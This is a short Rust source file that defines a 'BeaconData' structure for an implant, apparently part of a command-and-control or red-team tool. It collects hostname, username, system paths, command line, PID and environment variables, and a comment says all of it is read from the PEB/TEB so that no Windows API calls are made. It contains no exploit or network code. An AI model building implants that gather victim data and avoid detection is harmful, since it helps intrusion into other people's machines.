use serde::{Deserialize, Serialize};



/// Basic host information gathered by the implant,
/// 
/// Everything can be read from the PEB/TEB with no API calls to windows
#[derive(Debug, Deserialize, Serialize, Clone)]
pub(crate) struct BeaconData {
	hostname: String,
	username: String,
	tmpdir: String,
	appdata: String,
	windir: String,
	cwd: String,
	cmdline: String,
	pid: u64,
	env: Vec<String>,
}